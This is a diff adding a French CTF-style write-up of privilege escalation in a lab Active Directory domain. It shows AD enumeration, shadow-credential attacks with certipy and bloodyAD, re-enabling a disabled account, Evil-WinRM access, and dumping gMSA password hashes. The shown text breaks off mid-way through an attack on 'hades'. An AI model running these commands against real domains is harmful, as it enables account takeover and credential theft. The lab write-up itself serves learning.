@@ -52,6 +52,8 @@
       
     
     
+      <link rel="stylesheet" href="../../assets/stylesheets/extra.css">
+    
     <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
       
@@ -937,7 +939,431 @@
 
   <h1>Windows_Privesc</h1>
 
-
+<ul>
+<li>
+<p>Avec <code>rusthound</code> qui est un injestor bloodhound fait en rust on peut récupérer les information relative aux domain pour les lire sur <code>bloodhound</code> (<code>boodhound.py</code> ne fonctionne pas ici)</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>rusthound -d &quot;$DOMAIN&quot; -u &quot;$USER&quot;@&quot;$DOMAIN&quot; -p &quot;$PASSWORD&quot; --zip --ldaps --adcs --old-bloodhound
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>---------------------------------------------------
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Initializing RustHound at 00:14:53 on 06/23/25
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Powered by g0h4n from OpenCyber
+<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>---------------------------------------------------
+<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>
+<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>[2025-06-22T22:14:53Z INFO  rusthound] Verbosity level: Info
+<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>[2025-06-22T22:14:53Z INFO  rusthound::ldap] Connected to PANTHEON.GOD Active Directory!
+<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>[2025-06-22T22:14:53Z INFO  rusthound::ldap] Starting data collection...
+<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>[2025-06-22T22:14:53Z INFO  rusthound::ldap] All data collected for NamingContext DC=pantheon,DC=god
+<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>[2025-06-22T22:14:53Z INFO  rusthound::ldap] All data collected for NamingContext CN=Configuration,DC=pantheon,DC=god
+<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::parser] Starting the LDAP objects parsing...
+<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::parser::bh_41] MachineAccountQuota: 10
+<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>⢀ Parsing LDAP objects: 52%                                                                                                                                 [2025-06-22T22:14:53Z INFO  rusthound::modules::adcs::parser] Found 11 enabled certificate templates
+<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::parser] Parsing LDAP objects finished!
+<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::checker] Starting checker to replace some values...
+<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::checker] Checking and replacing some values finished!
+<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>[2025-06-22T22:14:53Z INFO  rusthound::modules] Starting checker for ADCS values...
+<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>[2025-06-22T22:14:53Z ERROR rusthound::modules::adcs::checker] Couldn&#39;t connect to server http://pantheon-dc01.pantheon.god/certsrv/, please try manually and check for https access if EPA is enable.
+<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>[2025-06-22T22:14:53Z INFO  rusthound::modules] Checking for ADCS values finished!
+<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 35 users parsed!
+<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 69 groups parsed!
+<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 2 computers parsed!
+<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 5 ous parsed!
+<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 1 domains parsed!
+<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 1 cas parsed!
+<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 33 templates parsed!
+<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 2 gpos parsed!
+<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] 21 containers parsed!
+<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>[2025-06-22T22:14:53Z INFO  rusthound::json::maker] .//20250623001453_pantheon-god_rusthound.zip created!
+<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>
+<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>RustHound Enumeration Completed at 00:14:53 on 06/23/25! Happy Graphing!
+</code></pre></div>
+</li>
+</ul>
+<p>On vois que notre utilisateur hercule est membre du groupe <code>OLYMPE-IMORTAL-HEROS</code> et que ce groupe à un generic  write sur plusieurs utilisateur fessant tous partie du groupe <code>TITANTS-BANNIS</code></p>
+<p><img alt="image.png" src="../writeup_sources/image.png" /></p>
+<p>Un des utilisateur de ce groupe est particulièrement intéressant car il fais partie du groupe <code>remote desktop users</code> et du groupe <code>remote management users</code> deux groupes ayant un droit d’accès a distance aux machine windows du domaine,</p>
+<p><img alt="image.png" src="../writeup_sources/image%201.png" /></p>
+<p>Étant donner qu’il y a un <code>ADCS</code> sur le <code>DC</code>, on peut récupérer un <code>TGT</code> et le hash de l’utilisateur <code>cronos</code> avec l’attaque <code>shadowcredential</code>  avec <code>bloodyAD+gettgtpkinit.py</code> ou simplement avec <code>certipy</code></p>
+<p>Mais dans les deux cas on ce retrouve avec l’erreur suivante :</p>
+<p><code>KDC_ERR_CLIENT_REVOKED Detail: "Client’s credentials have been revoked"</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>[hercule@pantheon.god][Jun 23, 2025 - 00:48:57 (CEST)] exegol-pantheon_wu bloodhound # certipy shadow auto -u &quot;$USER&quot;@&quot;$DOMAIN&quot; -p &quot;$PASSWORD&quot; -account &quot;$TargetUser&quot;
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>Certipy v4.8.2 - by Oliver Lyak (ly4k)
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>[*] Targeting user &#39;cronos&#39;
+<a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>[*] Generating certificate
+<a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>[*] Certificate generated
+<a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>[*] Generating Key Credential
+<a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>[*] Key Credential generated with DeviceID &#39;e9474057-1a78-2009-8229-bacb5681ca2d&#39;
+<a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>[*] Adding Key Credential with device ID &#39;e9474057-1a78-2009-8229-bacb5681ca2d&#39; to the Key Credentials for &#39;cronos&#39;
+<a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>[*] Successfully added Key Credential with device ID &#39;e9474057-1a78-2009-8229-bacb5681ca2d&#39; to the Key Credentials for &#39;cronos&#39;
+<a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a>[*] Authenticating as &#39;cronos&#39; with the certificate
+<a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a>[*] Using principal: cronos@pantheon.god
+<a id="__codelineno-1-13" name="__codelineno-1-13" href="#__codelineno-1-13"></a>[*] Trying to get TGT...
+<a id="__codelineno-1-14" name="__codelineno-1-14" href="#__codelineno-1-14"></a>[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+<a id="__codelineno-1-15" name="__codelineno-1-15" href="#__codelineno-1-15"></a>[*] Restoring the old Key Credentials for &#39;cronos&#39;
+<a id="__codelineno-1-16" name="__codelineno-1-16" href="#__codelineno-1-16"></a>[*] Successfully restored the old Key Credentials for &#39;cronos&#39;
+<a id="__codelineno-1-17" name="__codelineno-1-17" href="#__codelineno-1-17"></a>[*] NT hash for &#39;cronos&#39;: None
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>[hercule@pantheon.god][Jun 23, 2025 - 00:42:58 (CEST)] exegol-pantheon_wu bloodhound # bloodyAD -s --host &quot;$DC_IP&quot; -d &quot;$DOMAIN&quot; -u &quot;$USER&quot; -p &quot;$PASSWORD&quot; add shadowCredentials $TargetUser
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>[+] KeyCredential generated with following sha256 of RSA key: 4c6845977d25d5faa2c085eb0b4125977399c5f9905176713b85257adc71d61f
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>No outfile path was provided. The certificate(s) will be stored with the filename: zgmkD2Xx
+<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>[+] Saved PEM certificate at path: zgmkD2Xx_cert.pem
+<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>[+] Saved PEM private key at path: zgmkD2Xx_priv.pem
+<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+<a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>Run the following command to obtain a TGT:
+<a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>python3 PKINITtools/gettgtpkinit.py -cert-pem zgmkD2Xx_cert.pem -key-pem zgmkD2Xx_priv.pem pantheon.god/cronos zgmkD2Xx.ccache
+<a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>[hercule@pantheon.god][Jun 23, 2025 - 00:43:29 (CEST)] exegol-pantheon_wu bloodhound # gettgtpkinit.py -cert-pem zgmkD2Xx_cert.pem -key-pem zgmkD2Xx_priv.pem pantheon.god/cronos zgmkD2Xx.ccache
+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>....
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>minikerberos.protocol.errors.KerberosError:  Error Name: KDC_ERR_CLIENT_REVOKED Detail: &quot;Client’s credentials have been revoked&quot;
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>[hercule@pantheon.god][Jun 23, 2025 - 00:44:05 (CEST)] exegol-pantheon_wu bloodhound #
+</code></pre></div>
+<p>On comprend que le compte est desactiver et qu’il va falloire d’abord le réactiver affin de pouvoir l’utiliser, ce qui est possible avec <code>bloodyAD</code> par exemple :</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>[hercule@pantheon.god][Jun 23, 2025 - 01:19:39 (CEST)] exegol-pantheon_wu bloodhound # bloodyAD --host &quot;$DC_IP&quot; -d &quot;$DOMAIN&quot; -u &quot;$USER&quot; -p &quot;$PASSWORD&quot; remove uac $TargetUser -f ACCOUNTDISABLE
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>[-] [&#39;ACCOUNTDISABLE&#39;] property flags removed from cronos&#39;s userAccountControl
+</code></pre></div>
+<ul>
+<li>
+<p>Ainsi maintenant que le compte est réactiver, on peut l’utiliser pour effectuer notre attaque <code>shadowcredentials</code> et récupérer le hash de cette utilisateur</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>[hercule@pantheon.god][Jun 23, 2025 - 01:19:41 (CEST)] exegol-pantheon_wu bloodhound # faketime &quot;$(rdate -n $IP -p | awk &#39;{print $2, $3, $4}&#39; | date -f - &quot;+%Y-%m-%d %H:%M:%S&quot;)&quot; zsh
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>[hercule@pantheon.god][Jun 23, 2025 - 01:19:54 (CEST)] exegol-pantheon_wu bloodhound # certipy shadow auto -u &quot;$USER&quot;@&quot;$DOMAIN&quot; -p &quot;$PASSWORD&quot; -account &quot;$TargetUser&quot;
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>Certipy v4.8.2 - by Oliver Lyak (ly4k)
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>[*] Targeting user &#39;cronos&#39;
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>[*] Generating certificate
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>[*] Certificate generated
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>[*] Generating Key Credential
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>[*] Key Credential generated with DeviceID &#39;4db42bb3-8180-1c94-cfd4-104cb704ffea&#39;
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>[*] Adding Key Credential with device ID &#39;4db42bb3-8180-1c94-cfd4-104cb704ffea&#39; to the Key Credentials for &#39;cronos&#39;
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>[*] Successfully added Key Credential with device ID &#39;4db42bb3-8180-1c94-cfd4-104cb704ffea&#39; to the Key Credentials for &#39;cronos&#39;
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>[*] Authenticating as &#39;cronos&#39; with the certificate
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>[*] Using principal: cronos@pantheon.god
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>[*] Trying to get TGT...
+<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>[*] Got TGT
+<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>[*] Saved credential cache to &#39;cronos.ccache&#39;
+<a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>[*] Trying to retrieve NT hash for &#39;cronos&#39;
+<a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>[*] Restoring the old Key Credentials for &#39;cronos&#39;
+<a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>[*] Successfully restored the old Key Credentials for &#39;cronos&#39;
+<a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>[*] NT hash for &#39;cronos&#39;: d903644e45874322d8403de4c267ba64
+<a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>[hercule@pantheon.god][Jun 23, 2025 - 01:19:59 (CEST)] exegol-pan
+</code></pre></div>
+</li>
+</ul>
+<p>On confirme qu’il peut bien utiliser win-rm sur le dc</p>
+<p><img alt="image.png" src="../writeup_sources/image%202.png" /></p>
+<ul>
+<li>
+<p>Une fois connecter en tant que cronos, on remarque un répertoire peux habituel <code>coliseum</code> qui appartient à l’utilisateur <code>athena</code> et sur le quel nous avons tout les droits :</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>*Evil-WinRM* PS C:\Users\cronos\Documents&gt; ls /
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>    Directory: C:\
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>Mode                 LastWriteTime         Length Name
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>----                 -------------         ------ ----
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>d-----         6/21/2025   7:38 PM                coliseum
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>d-----         6/10/2025   4:36 AM                inetpub
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>d-----          4/1/2024   7:02 AM                PerfLogs
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>d-r---         6/10/2025   4:21 AM                Program Files
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>d-r---          4/1/2024   8:16 AM                Program Files (x86)
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>d-----         6/21/2025   7:37 PM                shares
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>d-r---         6/22/2025  11:26 PM                Users
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>d----l         6/21/2025   7:05 PM                vagrant
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>d-----         6/21/2025   7:31 PM                Windows
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>d-----         6/10/2025   2:15 PM                Windows.old
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>*Evil-WinRM* PS C:\Users\cronos\Documents&gt;
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>*Evil-WinRM* PS C:\coliseum&gt; icacls &quot;C:/coliseum/&quot;
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>C:/coliseum/ BUILTIN\Administrators:(F)
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>             PANTHEON\cronos:(OI)(CI)(F)
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>             BUILTIN\Administrators:(I)(OI)(CI)(F)
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>             BUILTIN\Users:(I)(OI)(CI)(RX)
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>             BUILTIN\Users:(I)(CI)(AD)
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>             BUILTIN\Users:(I)(CI)(WD)
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>             PANTHEON\athena:(I)(F)
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>             CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a> $path = &quot;C:\coliseum&quot;
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>(Get-Acl -Path $path).Access
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>...
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>FileSystemRights  : FullControl
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>AccessControlType : Allow
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>IdentityReference : PANTHEON\cronos
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>IsInherited       : False
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>InheritanceFlags  : ContainerInherit, ObjectInherit
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>PropagationFlags  : None
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>...
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>FileSystemRights  : FullControl
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a>AccessControlType : Allow
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a>IdentityReference : PANTHEON\athena
+<a id="__codelineno-7-14" name="__codelineno-7-14" href="#__codelineno-7-14"></a>IsInherited       : True
+<a id="__codelineno-7-15" name="__codelineno-7-15" href="#__codelineno-7-15"></a>InheritanceFlags  : None
+<a id="__codelineno-7-16" name="__codelineno-7-16" href="#__codelineno-7-16"></a>PropagationFlags  : None
+<a id="__codelineno-7-17" name="__codelineno-7-17" href="#__codelineno-7-17"></a>
+<a id="__codelineno-7-18" name="__codelineno-7-18" href="#__codelineno-7-18"></a>FileSystemRights  : 268435456
+<a id="__codelineno-7-19" name="__codelineno-7-19" href="#__codelineno-7-19"></a>AccessControlType : Allow
+<a id="__codelineno-7-20" name="__codelineno-7-20" href="#__codelineno-7-20"></a>IdentityReference : CREATOR OWNER
+<a id="__codelineno-7-21" name="__codelineno-7-21" href="#__codelineno-7-21"></a>IsInherited       : True
+<a id="__codelineno-7-22" name="__codelineno-7-22" href="#__codelineno-7-22"></a>InheritanceFlags  : ContainerInherit, ObjectInherit
+<a id="__codelineno-7-23" name="__codelineno-7-23" href="#__codelineno-7-23"></a>PropagationFlags  : InheritOnly
+</code></pre></div>
+</li>
+<li>
+<p>A l’intérieur un fichier <code>shell.ps1</code> vide sur le quel on à un contrôle totale et qui semble être executer par une tâche planifier</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>*Evil-WinRM* PS C:\coliseum&gt; ls
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>    Directory: C:\coliseum
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>Mode                 LastWriteTime         Length Name
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>----                 -------------         ------ ----
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>-a----         6/21/2025   7:38 PM              0 shell.ps1
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>*Evil-WinRM* PS C:\coliseum&gt;
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a> $path = &quot;C:\coliseum\shell.ps1&quot;
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>(Get-Acl -Path $path).Access
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>FileSystemRights  : FullControl
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a>AccessControlType : Allow
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a>IdentityReference : PANTHEON\cronos
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>IsInherited       : True
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a>InheritanceFlags  : None
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>PropagationFlags  : None
+</code></pre></div>
+</li>
+</ul>
+<p>……………..</p>
+<p>Une fois connecter en tant que athena, on peux upload <code>GMSAPasswordReader.exe</code> pour obtenir le hash du compte <code>svc_thunderB$</code></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>*Evil-WinRM* PS C:\Users\cronos\Documents&gt; cd &quot;C:/coliseum/&quot;
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>*Evil-WinRM* PS C:\coliseum&gt; upload /workspace/writeup/GMSAPasswordReader.exe
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>Warning: Remember that in docker environment all local paths should be at /data and it must be mapped correctly as a volume on docker run command
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>
+<a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>Info: Uploading /workspace/writeup/GMSAPasswordReader.exe to C:\coliseum\GMSAPasswordReader.exe
+<a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>
+<a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>Data: 139944 bytes of 139944 bytes copied
+<a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>
+<a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a>Info: Upload successful!
+<a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a>*Evil-WinRM* PS C:\coliseum&gt;
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>PS C:\coliseum&gt; .\GMSAPasswordReader.exe --AccountName &#39;svc_thunderB$&#39;
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>Calculating hashes for Current Value
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>[*] Input username             : svc_thunderB$
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>[*] Input domain               : PANTHEON.GOD
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>[*] Salt                       : PANTHEON.GODsvc_thunderB$
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a>[*]       rc4_hmac             : 64BD4596337D081643C878A6CD976307
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a>[*]       aes128_cts_hmac_sha1 : 2982C32362FBCC3C8327BE65974A93CF
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a>[*]       aes256_cts_hmac_sha1 : 7E38C98D4BCAAC2D749C4E3111A3B9222FBF174D6B410B5210282AB9D884324C
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a>[*]       des_cbc_md5          : C1168CC4E04A7A89
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a>
+<a id="__codelineno-11-11" name="__codelineno-11-11" href="#__codelineno-11-11"></a>PS C:\coliseum&gt;
+</code></pre></div>
+<p>On voit avec bloodhound que l’on à un génericWrite sur tout les Dieux à l’exeption de <code>Zeus</code> l’Administrateur du domain. Le dieux avec les droit les plus intérrésant semble être hades qui à un genericAll sur l’OU ENFERS et les enfant de cette dernière.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>[svc_thunderBpantheon.god][Jun 24, 2025 - 04:05:14 (CEST)] exegol-pantheon_wu bloodhound # certipy shadow auto -u &quot;$USER&quot;@&quot;$DOMAIN&quot; -hashes &quot;:$NT_HASH&quot; -account &quot;$TargetUser&quot;
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>Certipy v4.8.2 - by Oliver Lyak (ly4k)
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>[*] Targeting user &#39;hades&#39;
